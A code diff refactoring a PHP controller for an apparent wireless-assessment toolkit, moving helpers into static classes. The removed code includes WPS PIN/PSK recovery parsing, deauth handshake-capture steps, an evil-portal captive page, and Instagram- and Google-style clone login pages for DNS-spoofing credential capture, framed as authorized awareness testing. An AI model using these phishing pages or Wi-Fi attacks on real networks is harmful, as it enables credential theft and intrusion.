         $band = ($channel <= 14) ? '2g' : '5g';
         $bandLabel = ($band === '2g') ? '2.4 GHz' : '5 GHz';
 
-        $uciRadios = $this->uciRadioMap();
+        $uciRadios = WaSystemInfo::uciRadioMap();
         $radioName = '';
         $radioPath = '';
         $radioDisabled = false;
@@ -2208,7 +1887,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
                 break;
             }
         }
-        if ($radioName === '' || !$this->isSafeRadio($radioName)) {
+        if ($radioName === '' || !WaValidators::isSafeRadio($radioName)) {
             return null;
         }
 
@@ -2229,7 +1908,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
                 }
             }
         }
-        if ($phyName === '' || !$this->isSafePhy($phyName)) {
+        if ($phyName === '' || !WaValidators::isSafePhy($phyName)) {
             return null;
         }
 
@@ -2254,13 +1933,13 @@ class Wireless_assessmentController extends \frieren\core\Controller
         }
 
         $scanIface = '';
-        foreach ($this->getWirelessInterfaces() as $iface) {
+        foreach (WaSystemInfo::getWirelessInterfaces() as $iface) {
             if (in_array($bandLabel, $phyBands[$iface['phy']] ?? [], true)) {
                 $scanIface = $iface['name'];
                 break;
             }
         }
-        if ($scanIface === '' || !$this->isSafeInterfaceName($scanIface)) {
+        if ($scanIface === '' || !WaValidators::isSafeInterfaceName($scanIface)) {
             return null;
         }
 
@@ -2269,7 +1948,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             return null;
         }
 
-        foreach ($this->parseIwinfoScan($output) as $network) {
+        foreach (WaParsers::parseIwinfoScan($output) as $network) {
             if (strtolower($network['bssid']) === $bssid && $network['channel'] !== '') {
                 $ch = (int)$network['channel'];
                 if ($ch >= 1 && $ch <= 196) {
@@ -2507,202 +2186,10 @@ class Wireless_assessmentController extends \frieren\core\Controller
     // discovery is done by parsing beacon/probe-response frames from an airodump
     // capture and reading the WPS information element (OUI 00:50:F2 type 04)
     // directly. Returns only APs that actually advertise WPS.
-    private function parseWpsCapture($pcapPath)
-    {
-        $data = @file_get_contents($pcapPath);
-        if (!is_string($data) || strlen($data) < 24) {
-            return [];
-        }
-
-        $magic = substr($data, 0, 4);
-        if ($magic === "\xd4\xc3\xb2\xa1") {
-            $le = true;
-        } elseif ($magic === "\xa1\xb2\xc3\xd4") {
-            $le = false;
-        } else {
-            return [];
-        }
-        $u32 = function ($s) use ($le) {
-            $b = array_values(unpack('C4', $s));
-            return $le
-                ? ($b[0] | ($b[1] << 8) | ($b[2] << 16) | ($b[3] << 24))
-                : (($b[0] << 24) | ($b[1] << 16) | ($b[2] << 8) | $b[3]);
-        };
-
-        $linktype = $u32(substr($data, 20, 4));
-        $len = strlen($data);
-        $off = 24;
-        $found = [];
-
-        while ($off + 16 <= $len) {
-            $inclLen = $u32(substr($data, $off + 8, 4));
-            $off += 16;
-            if ($inclLen <= 0 || $off + $inclLen > $len) {
-                break;
-            }
-            $pkt = substr($data, $off, $inclLen);
-            $off += $inclLen;
-
-            // Strip radiotap (linktype 127); its it_len at bytes 2-3 is always LE.
-            // Pull the dBm antenna-signal field out of the header before discarding it.
-            $frame = $pkt;
-            $signal = null;
-            if ($linktype === 127) {
-                if (strlen($pkt) < 4) {
-                    continue;
-                }
-                $rtLen = ord($pkt[2]) | (ord($pkt[3]) << 8);
-                if ($rtLen < 8 || $rtLen >= strlen($pkt)) {
-                    continue;
-                }
-                $signal = $this->radiotapSignal(substr($pkt, 0, $rtLen));
-                $frame = substr($pkt, $rtLen);
-            }
-            if (strlen($frame) < 38) {
-                continue;
-            }
-
-            $fc = ord($frame[0]);
-            // Management beacon (0x80) or probe response (0x50) carry the WPS IE.
-            if ($fc !== 0x80 && $fc !== 0x50) {
-                continue;
-            }
-
-            $bssidRaw = substr($frame, 16, 6);
-            $bssid = strtolower(implode(':', str_split(bin2hex($bssidRaw), 2)));
-            $ies = substr($frame, 36);
-
-            $ssid = '';
-            $channel = '';
-            $hasWps = false;
-            $locked = false;
-            $version = '';
-
-            $p = 0;
-            $ieLen = strlen($ies);
-            while ($p + 2 <= $ieLen) {
-                $tag = ord($ies[$p]);
-                $tlen = ord($ies[$p + 1]);
-                $p += 2;
-                if ($p + $tlen > $ieLen) {
-                    break;
-                }
-                $val = substr($ies, $p, $tlen);
-                $p += $tlen;
-
-                if ($tag === 0) {
-                    $ssid = $val;
-                } elseif ($tag === 3 && $tlen >= 1) {
-                    $channel = (string)ord($val[0]);
-                } elseif ($tag === 221 && $tlen >= 4 && substr($val, 0, 4) === "\x00\x50\xf2\x04") {
-                    $hasWps = true;
-                    $wd = substr($val, 4);
-                    $q = 0;
-                    $wl = strlen($wd);
-                    while ($q + 4 <= $wl) {
-                        $atype = (ord($wd[$q]) << 8) | ord($wd[$q + 1]);
-                        $alen = (ord($wd[$q + 2]) << 8) | ord($wd[$q + 3]);
-                        $q += 4;
-                        if ($q + $alen > $wl) {
-                            break;
-                        }
-                        $aval = substr($wd, $q, $alen);
-                        $q += $alen;
-                        if ($atype === 0x1057 && $alen >= 1) {
-                            $locked = (ord($aval[0]) === 1);
-                        } elseif ($atype === 0x104A && $alen >= 1) {
-                            $version = (ord($aval[0]) >= 0x20) ? '2.0' : '1.0';
-                        }
-                    }
-                    if ($version === '') {
-                        $version = '1.0';
-                    }
-                }
-            }
-
-            if (!$hasWps) {
-                continue;
-            }
-            // Prefer the entry with the most information; keep first-seen SSID/channel.
-            $prev = $found[$bssid] ?? null;
-            // Track the strongest signal seen for this BSSID (closest to 0 dBm).
-            $prevSig = ($prev !== null && $prev['signalVal'] !== null) ? $prev['signalVal'] : null;
-            $bestSig = $prevSig;
-            if ($signal !== null && ($bestSig === null || $signal > $bestSig)) {
-                $bestSig = $signal;
-            }
-            $found[$bssid] = [
-                'bssid' => $bssid,
-                'channel' => $channel !== '' ? $channel : ($prev['channel'] ?? ''),
-                'ssid' => $this->cleanSsid($ssid !== '' ? $ssid : ($prev['ssidRaw'] ?? '')),
-                'ssidRaw' => $ssid !== '' ? $ssid : ($prev['ssidRaw'] ?? ''),
-                'wpsVersion' => $version,
-                'wpsLocked' => $locked || (bool)($prev['wpsLocked'] ?? false),
-                'signalVal' => $bestSig,
-                'signal' => $bestSig !== null ? ($bestSig . ' dBm') : '',
-            ];
-        }
-
-        $networks = array_values($found);
-        foreach ($networks as &$n) {
-            unset($n['ssidRaw'], $n['signalVal']);
-        }
-        return $networks;
-    }
 
     // Parse the dBm antenna-signal field (radiotap bit 5) out of a radiotap
     // header. Walks the present bitmap(s) and the preceding fixed-size fields,
     // honouring radiotap's natural alignment. Returns an int (dBm) or null.
-    private function radiotapSignal($rt)
-    {
-        $len = strlen($rt);
-        if ($len < 8) {
-            return null;
-        }
-        // Read present word(s); bit 31 flags another 32-bit present word follows.
-        $o = 4;
-        $word0 = null;
-        while ($o + 4 <= $len) {
-            $w = ord($rt[$o]) | (ord($rt[$o + 1]) << 8) | (ord($rt[$o + 2]) << 16) | (ord($rt[$o + 3]) << 24);
-            if ($word0 === null) {
-                $word0 = $w;
-            }
-            $o += 4;
-            if (!($w & 0x80000000)) {
-                break;
-            }
-        }
-        if ($word0 === null || !($word0 & (1 << 5))) {
-            return null; // no antenna-signal field advertised
-        }
-        // Fixed-size fields that precede bit 5: [bit => [align, size]].
-        $fields = [0 => [8, 8], 1 => [1, 1], 2 => [1, 1], 3 => [2, 4], 4 => [2, 2]];
-        $pos = $o; // data area begins right after the present words
-        foreach ($fields as $bit => $fs) {
-            if ($word0 & (1 << $bit)) {
-                list($align, $size) = $fs;
-                if ($pos % $align !== 0) {
-                    $pos += $align - ($pos % $align);
-                }
-                $pos += $size;
-            }
-        }
-        if ($pos >= $len) {
-            return null;
-        }
-        $b = ord($rt[$pos]);
-        return $b >= 128 ? $b - 256 : $b; // signed int8, dBm
-    }
-
-    private function cleanSsid($raw)
-    {
-        $raw = (string)$raw;
-        if ($raw === '' || trim($raw) === '' || strspn($raw, "\0") === strlen($raw)) {
-            return '<hidden>';
-        }
-        $clean = preg_replace('/[\x00-\x1F\x7F]/', '', $raw);
-        return $clean !== '' ? $clean : '<hidden>';
-    }
 
     private function mergeWpsResults($networks)
     {
@@ -2902,40 +2389,6 @@ class Wireless_assessmentController extends \frieren\core\Controller
         return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
     }
 
-    private function parseWpsAttackResult($output)
-    {
-        $output = (string)$output;
-        $pin = '';
-        $psk = '';
-        $ssid = '';
-        if (preg_match("/WPS PIN:\s*'?([0-9]{4,8})'?/i", $output, $m)) {
-            $pin = $m[1];
-        }
-        if ($pin === '' && preg_match("/WPS pin:\s*([0-9]{4,8})/i", $output, $m)) {
-            $pin = $m[1];
-        }
-        if (preg_match("/WPA PSK:\s*'([^']*)'/i", $output, $m)) {
-            $psk = $m[1];
-        }
-        if (preg_match("/AP SSID:\s*'([^']*)'/i", $output, $m)) {
-            $ssid = $m[1];
-        }
-        $locked = (bool)preg_match('/WPS (?:transaction|lock)|AP (?:rate limiting|locked)|WARNING.*lock/i', $output);
-        return [
-            'success' => ($pin !== '' || $psk !== ''),
-            'pin' => $pin,
-            'psk' => $psk,
-            'ssid' => $ssid,
-            'locked' => $locked,
-        ];
-    }
-
-    private function stepEntry($key, $label, $status, $detail)
-    {
-        // status: pending | active | done | failed | warn | skipped
-        return ['key' => $key, 'label' => $label, 'status' => $status, 'detail' => $detail];
-    }
-
     // Turn reaver's live -vv output into an ordered, human-readable step timeline so
     // the operator can see exactly which phase is running and where it stalls.
     private function deriveWpsSteps($log, $err, $pending, $mode, $result)
@@ -2955,19 +2408,19 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $success = !empty($result['pin']) || !empty($result['psk']);
 
         $steps = [];
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'setup',
             'Radio → monitor mode',
             $monitorFail ? 'failed' : ($monitorUp ? 'done' : ($pending ? 'active' : 'failed')),
             $monitorFail ? 'Could not create the monitor interface.' : 'Put the radio into monitor mode and locked onto the target channel.'
         );
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'beacon',
             'Find the AP (beacon)',
             $associated ? 'done' : ($monitorUp ? ($pending ? 'active' : 'failed') : 'pending'),
             $associated ? 'Received a beacon from the target.' : 'Listening for the target AP on its channel.'
         );
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'assoc',
             'Associate with AP',
             $associated ? 'done' : ($failedAssoc ? ($pending ? 'active' : 'failed') : ($pending ? 'pending' : 'skipped')),
@@ -2975,20 +2428,20 @@ class Wireless_assessmentController extends \frieren\core\Controller
         );
 
         if ($mode === 'pixie') {
-            $steps[] = $this->stepEntry(
+            $steps[] = WaParsers::stepEntry(
                 'wps',
                 'WPS handshake (collect M1–M3)',
                 ($pixieRun || $success) ? 'done' : ($tryingPins ? 'active' : ($associated ? ($pending ? 'active' : 'failed') : 'pending')),
                 'Exchanging WPS messages to collect the nonces pixie-dust needs.'
             );
-            $steps[] = $this->stepEntry(
+            $steps[] = WaParsers::stepEntry(
                 'pixie',
                 'Pixie-Dust computation',
                 $success ? 'done' : ($pinNotFound ? 'failed' : ($pixieRun ? 'active' : ($pending ? 'pending' : 'skipped'))),
                 $pinNotFound ? 'AP is not vulnerable to pixie-dust — no PIN recovered.' : 'Running pixiewps against the collected data.'
             );
         } else {
-            $steps[] = $this->stepEntry(
+            $steps[] = WaParsers::stepEntry(
                 'wps',
                 'Trying WPS PINs (online)',
                 $success ? 'done' : ($tryingPins ? 'active' : ($associated ? ($pending ? 'active' : 'failed') : 'pending')),
@@ -2996,7 +2449,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             );
         }
 
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'result',
             'Recover PIN / passphrase',
             $success ? 'done' : ($pending ? 'pending' : 'failed'),
@@ -3006,33 +2459,6 @@ class Wireless_assessmentController extends \frieren\core\Controller
         );
 
         return $steps;
-    }
-
-    private function wpsStopReason($log, $err, $result)
-    {
-        $t = (string)$log . "\n" . (string)$err;
-        if (!empty($result['pin']) || !empty($result['psk'])) {
-            return ['level' => 'success', 'text' => 'Recovered the WPS credentials.'];
-        }
-        if (preg_match('/stop requested/i', $t)) {
-            return ['level' => 'warn', 'text' => 'Stopped by you.'];
-        }
-        if (preg_match('/failed to create monitor/i', $t)) {
-            return ['level' => 'danger', 'text' => 'Could not put the radio into monitor mode. Free the radio (Lab mode) and retry.'];
-        }
-        if (preg_match('/Detected AP rate limiting|WPS.*lock|AP (?:locked|rate limiting)/i', $t)) {
-            return ['level' => 'danger', 'text' => 'The AP is rate-limiting / locking WPS. It throttles guesses so the attack cannot proceed — most routers lock WPS after a few failed attempts. Wait for the lock to clear, or this AP has WPS lockout protection.'];
-        }
-        if (preg_match('/WPS pin not found|pixiewps.*fail/i', $t)) {
-            return ['level' => 'danger', 'text' => 'Pixie-Dust did not recover the PIN — this AP is not vulnerable to the offline pixie-dust attack. Patched APs are immune. You can try PIN mode (online, slow), but it may be rate-limited.'];
-        }
-        if (preg_match('/Failed to associate/i', $t) && !preg_match('/Associated with/i', $t)) {
-            return ['level' => 'danger', 'text' => 'Could not associate with the AP — out of range, wrong channel, or the AP is not responding. Re-scan to refresh the channel and check signal.'];
-        }
-        if (preg_match('/receive timeout occurred/i', $t)) {
-            return ['level' => 'warn', 'text' => 'Timed out waiting for the AP to respond. It may be far away or busy — try again closer, or raise the timeout.'];
-        }
-        return ['level' => 'warn', 'text' => 'The attack ended without recovering the PIN (timed out or the AP stopped responding). Try a longer timeout, or PIN mode.'];
     }
 
     // Step timeline for the PMKID/handshake capture pipeline.
@@ -3052,25 +2478,25 @@ class Wireless_assessmentController extends \frieren\core\Controller
         $hashCount = (int)($result['hashCount'] ?? 0);
 
         $steps = [];
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'setup',
             'Radio → monitor mode',
             $monitorFail ? 'failed' : ($monitorUp ? 'done' : ($pending ? 'active' : 'failed')),
             $monitorFail ? 'Could not create the monitor interface.' : 'Put the radio into monitor mode and locked onto the target channel.'
         );
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'listen',
             'Listen for 4-way handshake',
             $handshake ? 'done' : ($monitorUp ? ($pending ? 'active' : 'failed') : 'pending'),
             $handshake ? 'A WPA handshake / PMKID was seen on the air.' : 'airodump-ng is capturing frames on the target BSSID.'
         );
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'deauth',
             'Deauth to force a reconnect',
             $deauth ? ($deauthSent ? 'done' : ($pending ? 'active' : 'warn')) : 'skipped',
             $deauth ? 'Sending deauth bursts so a client reconnects and replays the handshake.' : 'Deauth disabled — waiting for a natural client reconnect.'
         );
-        $steps[] = $this->stepEntry(
+        $steps[] = WaParsers::stepEntry(
             'convert',
             'Convert to hashcat 22000',
             ($hashCount > 0) ? 'done' : ($noCapFile ? 'failed' : ($converting ? 'active' : ($pending ? 'pending' : 'failed'))),
@@ -3078,25 +2504,6 @@ class Wireless_assessmentController extends \frieren\core\Controller
         );
 
         return $steps;
-    }
-
-    private function captureStopReason($log, $err, $result)
-    {
-        $t = (string)$log . "\n" . (string)$err;
-        if (!empty($result['handshakeCaptured'])) {
-            $n = (int)($result['hashCount'] ?? 0);
-            return ['level' => 'success', 'text' => 'Captured ' . $n . ' hash' . ($n === 1 ? '' : 'es') . ' — ready to download / crack.'];
-        }
-        if (preg_match('/stop requested/i', $t)) {
-            return ['level' => 'warn', 'text' => 'Stopped by you.'];
-        }
-        if (preg_match('/failed to create monitor/i', $t)) {
-            return ['level' => 'danger', 'text' => 'Could not put the radio into monitor mode. Free the radio (Lab mode) and retry.'];
-        }
-        if (preg_match('/no capture file was produced/i', $t)) {
-            return ['level' => 'danger', 'text' => 'airodump-ng produced no capture — the monitor may have been on the wrong channel. Re-scan the target to refresh its channel and retry.'];
-        }
-        return ['level' => 'warn', 'text' => 'No handshake captured — no client re-authenticated during the window. Make sure a device is connected to the target, enable deauth, target a specific client MAC, or use a longer duration.'];
     }
 
     private function beaconJobDir()
@@ -3193,79 +2600,6 @@ class Wireless_assessmentController extends \frieren\core\Controller
         shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $script . ' ) >/dev/null 2>&1 &'));
 
         return self::setSuccess(['pending' => true, 'jobId' => $jobId, 'meta' => $meta]);
-    }
-
-    private function parseAirodumpCsv($csv)
-    {
-        $aps = [];
-        $clients = [];
-        $csv = str_replace("\r", '', (string)$csv);
-        $lines = explode("\n", $csv);
-        $section = 'none';
-        foreach ($lines as $line) {
-            $trim = trim($line);
-            if ($trim === '') {
-                continue;
-            }
-            if (strpos($trim, 'BSSID,') === 0 && stripos($trim, 'First time seen') !== false) {
-                $section = 'ap';
-                continue;
-            }
-            if (strpos($trim, 'Station MAC,') === 0) {
-                $section = 'client';
-                continue;
-            }
-
-            $cols = array_map('trim', explode(',', $line));
-            if ($section === 'ap') {
-                if (count($cols) < 14 || !$this->isSafeBssid(strtolower($cols[0]))) {
-                    continue;
-                }
-                $bssid = strtolower($cols[0]);
-                $privacy = $cols[5];
-                $cipher = $cols[6];
-                $auth = $cols[7];
-                $security = trim($privacy);
-                if ($security === '' || strtoupper($security) === 'OPN') {
-                    $security = 'Open';
-                } else {
-                    $security = trim($privacy . ($cipher !== '' ? ' ' . $cipher : '') . ($auth !== '' ? ' ' . $auth : ''));
-                }
-                $essid = isset($cols[13]) ? $cols[13] : '';
-                $aps[] = [
-                    'bssid' => $bssid,
-                    'channel' => (string)((int)$cols[3]),
-                    'security' => $security,
-                    'signal' => ($cols[8] !== '' ? $cols[8] . ' dBm' : ''),
-                    'beacons' => (int)($cols[9] ?? 0),
-                    'ssid' => $this->cleanSsid($essid),
-                ];
-            } elseif ($section === 'client') {
-                if (count($cols) < 6 || !$this->isSafeBssid(strtolower($cols[0]))) {
-                    continue;
-                }
-                $mac = strtolower($cols[0]);
-                $assoc = strtolower($cols[5]);
-                $associated = $this->isSafeBssid($assoc) ? $assoc : '';
-                $probes = [];
-                if (isset($cols[6])) {
-                    for ($i = 6; $i < count($cols); $i++) {
-                        $probe = trim($cols[$i]);
-                        if ($probe !== '') {
-                            $probes[] = $probe;
-                        }
-                    }
-                }
-                $clients[] = [
-                    'mac' => $mac,
-                    'bssid' => $associated,
-                    'signal' => ($cols[3] !== '' ? $cols[3] . ' dBm' : ''),
-                    'packets' => (int)($cols[4] ?? 0),
-                    'probes' => $probes,
-                ];
-            }
-        }
-        return ['aps' => $aps, 'clients' => $clients];
     }
 
     private function mergeBeaconResults($aps, $clients)
@@ -3396,12 +2730,6 @@ class Wireless_assessmentController extends \frieren\core\Controller
         return $best;
     }
 
-    private function sanitizeSsidForConf($ssid)
-    {
-        $ssid = preg_replace('/[\x00-\x1F\x7F]/', '', (string)$ssid);
-        return substr($ssid, 0, 32);
-    }
-
     private function launchEvilPortal($bssid, $ssid, $channel, $monitor, $verifyCap, $band = '2g', $internet = false, $uplinkDev = '', $template = 'wifi', $customHtml = '')
     {
         $rt = $this->evilPortalDir();
@@ -3413,7 +2741,7 @@ class Wireless_assessmentController extends \frieren\core\Controller
             return self::setError('Unable to create Evil Portal runtime directory.');
         }
 
-        $safeSsid = $this->sanitizeSsidForConf($ssid);
+        $safeSsid = WaValidators::sanitizeSsidForConf($ssid);
         $hasVerify = false;
         if ($verifyCap !== '' && is_file($verifyCap)) {
             @copy($verifyCap, $rt . '/verify.cap');
@@ -3567,37 +2895,9 @@ class Wireless_assessmentController extends \frieren\core\Controller
         ]);
     }
 
-    private function portalTemplateDefs()
-    {
-        // Neutral, non-brand-impersonating templates for authorized self-assessment.
-        // Each declares the fields its form posts to /cgi-bin/submit.
-        return [
-            'wifi' => [
-                'label' => 'Wi-Fi password',
-                'description' => 'Asks for the network password (can verify offline against a captured handshake).',
-                'fields' => ['password'],
-            ],
-            'router' => [
-                'label' => 'Router admin login',
-                'description' => 'Generic router administration sign-in (username + password).',
-                'fields' => ['username', 'password'],
-            ],
-            'isp' => [
-                'label' => 'Internet sign-in',
-                'description' => 'Generic ISP / Wi-Fi account sign-in (email + password).',
-                'fields' => ['email', 'password'],
-            ],
-            'custom' => [
-                'label' => 'Custom HTML',
-                'description' => 'Your own page. Must contain a <form method=post action=/cgi-bin/submit>.',
-                'fields' => [],
-            ],
-        ];
-    }
-
     private function writePortalAssets($www, $bssid, $ssid, $hasVerify, $template = 'wifi', $customHtml = '')
     {
-        $defs = $this->portalTemplateDefs();
+        $defs = WaTemplates::portalTemplateDefs();
         if (!isset($defs[$template])) {
             $template = 'wifi';
         }
@@ -3737,7 +3037,7 @@ SH;
         foreach ($files as $path) {
             foreach (explode("\n", (string)@file_get_contents($path)) as $line) {
                 $parts = preg_split('/\s+/', trim($line));
-                if (count($parts) >= 3 && $this->isSafeBssid(strtolower($parts[1])) && strpos($parts[2], '10.0.0.') === 0) {
+                if (count($parts) >= 3 && WaValidators::isSafeBssid(strtolower($parts[1])) && strpos($parts[2], '10.0.0.') === 0) {
                     $mac = strtolower($parts[1]);
                     if (isset($seen[$mac])) {
                         continue;
@@ -3751,7 +3051,7 @@ SH;
                 }
             }
         }
-        return $this->attachVendors($clients, 'mac');
+        return WaVendorLookup::attachVendors($clients, 'mac');
     }
 
     private function readEvilPortalCreds()
@@ -3794,16 +3094,6 @@ SH;
             }
         }
         return $creds;
-    }
-
-    private function firstVerifiedPassword($credentials)
-    {
-        foreach ($credentials as $cred) {
-            if (!empty($cred['verified'])) {
-                return $cred['password'];
-            }
-        }
-        return '';
     }
 
     private function teardownEvilPortal()
@@ -3894,78 +3184,9 @@ SH;
     // one of these instead of the plain notice page. Kept as neutral, styled-text
     // wordmarks (not the real brand's assets) — enough to run a believable
     // credential-capture awareness demo without reproducing trademarked logos.
-    private function mitmCloneTemplateDefs()
-    {
-        return [
-            'instagram' => ['label' => 'Instagram-style login', 'description' => 'Username/email + password clone login page.'],
-            'google' => ['label' => 'Google-style sign-in', 'description' => 'Email + password clone sign-in page.'],
-        ];
-    }
-
-    private function mitmNoticePage($msg)
-    {
-        $m = htmlspecialchars($msg !== '' ? $msg : 'This site has been redirected as part of an authorized security assessment.', ENT_QUOTES);
-        return "<!doctype html><html><head><meta charset=utf-8>"
-            . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Notice</title>"
-            . "<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0f172a;color:#e2e8f0;"
-            . "display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}"
-            . ".b{max-width:440px;padding:28px;text-align:center}h1{font-size:20px}p{color:#94a3b8;font-size:15px}</style>"
-            . "</head><body><div class=b><h1>Security assessment</h1><p>{$m}</p></div></body></html>";
-    }
 
     // Shown right after a clone-page submit, in place of the real destination —
     // the whole point of a clone rule is to demonstrate the risk immediately.
-    private function mitmGotchaPage()
-    {
-        return "<!doctype html><html><head><meta charset=utf-8>"
-            . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Security awareness test</title>"
-            . "<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0f172a;color:#e2e8f0;"
-            . "display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}"
-            . ".b{max-width:460px;padding:32px;text-align:center}h1{color:#f87171;font-size:20px}p{color:#94a3b8;font-size:15px}</style>"
-            . "</head><body><div class=b><h1>This was a simulated phishing test</h1>"
-            . "<p>You just entered credentials into a fake login page as part of an authorized security assessment on this network. "
-            . "If this had been a real attack, that account would now be compromised.</p>"
-            . "<p>Check the address bar before signing in anywhere, and never reuse this password if it was real.</p></div></body></html>";
-    }
-
-    private function renderMitmClonePage($template)
-    {
-        if ($template === 'instagram') {
-            return "<!doctype html><html><head><meta charset=utf-8>"
-                . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Instagram</title>"
-                . "<style>body{font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fafafa;margin:0}"
-                . ".wrap{max-width:350px;margin:60px auto;padding:0 20px}"
-                . ".card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:36px 40px 20px;text-align:center}"
-                . ".logo{font-size:42px;margin:22px 0 30px;font-weight:600;font-style:italic;"
-                . "background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}"
-                . "input{width:100%;box-sizing:border-box;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;margin:3px 0;font-size:14px}"
-                . "button{width:100%;margin-top:10px;padding:9px;border:0;border-radius:8px;background:#4cb5f9;color:#fff;font-weight:600}"
-                . ".sep{color:#8e8e8e;font-size:13px;margin:14px 0}"
-                . ".foot{border:1px solid #dbdbdb;border-radius:1px;margin-top:12px;padding:18px;font-size:14px;text-align:center}</style>"
-                . "</head><body><div class=wrap><div class=card><div class=logo>Instagram</div>"
-                . "<form method=post action=/cgi-bin/submit>"
-                . "<input type=text name=username placeholder='Phone number, username, or email' autofocus required>"
-                . "<input type=password name=password placeholder='Password' required>"
-                . "<button type=submit>Log in</button></form><div class=sep>Forgot password?</div></div>"
-                . "<div class=foot>Don't have an account? <b>Sign up</b></div></div></body></html>";
-        }
-        if ($template === 'google') {
-            return "<!doctype html><html><head><meta charset=utf-8>"
-                . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Sign in - Accounts</title>"
-                . "<style>body{font-family:Roboto,Arial,sans-serif;background:#fff;margin:0}"
-                . ".wrap{max-width:450px;margin:40px auto;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;box-sizing:border-box}"
-                . ".logo{font-size:24px;font-weight:400;margin-bottom:16px}.logo b{color:#4285F4}"
-                . "h1{font-size:24px;font-weight:400;margin:8px 0}p{color:#5f6368;font-size:16px}"
-                . "input{width:100%;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;margin:8px 0;font-size:16px}"
-                . "button{float:right;margin-top:20px;padding:10px 24px;border:0;border-radius:4px;background:#1a73e8;color:#fff;font-weight:600}</style>"
-                . "</head><body><div class=wrap><div class=logo><b>G</b>oogle</div><h1>Sign in</h1><p>to continue</p>"
-                . "<form method=post action=/cgi-bin/submit>"
-                . "<input type=email name=email placeholder='Email or phone' autofocus required>"
-                . "<input type=password name=password placeholder='Password' required>"
-                . "<button type=submit>Next</button></form></div></body></html>";
-        }
-        return $this->mitmNoticePage('');
-    }
 
     // Writes the MITM landing site: one dispatch CGI keyed by the Host header (so
     // one uhttpd instance serves every ruled domain differently), a per-domain
@@ -3979,8 +3200,8 @@ SH;
         @mkdir($www . '/pages', 0755, true);
         @mkdir($www . '/cgi-bin', 0755, true);
 
-        @file_put_contents($www . '/index.html', $this->mitmNoticePage($noticeMsg));
-        @file_put_contents($www . '/gotcha.html', $this->mitmGotchaPage());
+        @file_put_contents($www . '/index.html', WaTemplates::mitmNoticePage($noticeMsg));
+        @file_put_contents($www . '/gotcha.html', WaTemplates::mitmGotchaPage());
 
         $rulesLines = '';
         foreach ($rules as $r) {
@@ -3989,7 +3210,7 @@ SH;
                 $rulesLines .= $domain . '|redirect|' . $r['target'] . "\n";
             } elseif ($r['action'] === 'clone') {
                 $safe = preg_replace('/[^a-z0-9.-]/', '_', $domain);
-                @file_put_contents($www . '/pages/' . $safe . '.html', $this->renderMitmClonePage($r['template']));
+                @file_put_contents($www . '/pages/' . $safe . '.html', WaTemplates::renderMitmClonePage($r['template']));
                 $rulesLines .= $domain . '|clone|' . $safe . "\n";
             }
             // 'notice' domains need no line; the CGI's default action is notice.
@@ -4054,7 +3275,7 @@ SH;
         // notice, an open HTTP redirect to any URL ("send google.com anywhere"),
         // or a clone login page (credential-capture awareness demo). All three ride
         // the same DNS-spoof + local-uhttpd plumbing; only the served response differs.
-        $cloneTemplates = array_keys($this->mitmCloneTemplateDefs());
+        $cloneTemplates = array_keys(WaTemplates::mitmCloneTemplateDefs());
         $rules = [];
         $rawRules = $this->request['rules'] ?? [];
         if (is_array($rawRules)) {
@@ -4158,7 +3379,7 @@ SH;
             }
         }
         $cloneTemplates = [];
-        foreach ($this->mitmCloneTemplateDefs() as $id => $def) {
+        foreach (WaTemplates::mitmCloneTemplateDefs() as $id => $def) {
             $cloneTemplates[] = ['id' => $id, 'label' => $def['label'], 'description' => $def['description']];
         }
 
@@ -4239,7 +3460,7 @@ SH;
     private function readReconDatabase()
     {
         @unlink($this->reconDbPath());
-        return $this->defaultReconDatabase();
+        return WaSystemInfo::defaultReconDatabase();
     }
 
     private function writeReconDatabase($db)
@@ -4247,21 +3468,13 @@ SH;
         return true;
     }
 
-    private function cleanMetadataText($value, $maxLength)
-    {
-        $text = is_string($value) ? $value : '';
-        $text = preg_replace('/[\x00-\x1F\x7F]/', ' ', $text);
-        $text = trim(preg_replace('/\s+/', ' ', $text));
-        return substr($text, 0, $maxLength);
-    }
-
     private function normalizeTargetMetadata($metadata)
     {
         $metadata = is_array($metadata) ? $metadata : [];
         return [
             'authorized' => !empty($metadata['authorized']),
-            'label' => $this->cleanMetadataText($metadata['label'] ?? '', 80),
-            'notes' => $this->cleanMetadataText($metadata['notes'] ?? '', 500),
+            'label' => WaValidators::cleanMetadataText($metadata['label'] ?? '', 80),
+            'notes' => WaValidators::cleanMetadataText($metadata['notes'] ?? '', 500),
         ];
     }
 
@@ -4306,137 +3519,8 @@ SH;
         return $this->writeReconDatabase($db);
     }
 
-    private function parseIwScan($output)
-    {
-        $networks = [];
-        $blocks = preg_split('/\nBSS\s+/', "\n" . trim($output));
-        foreach ($blocks as $block) {
-            $block = trim($block);
-            if ($block === '' || stripos($block, 'last seen') === false) {
-                continue;
-            }
-            $network = [
-                'bssid' => '',
-                'ssid' => '<hidden>',
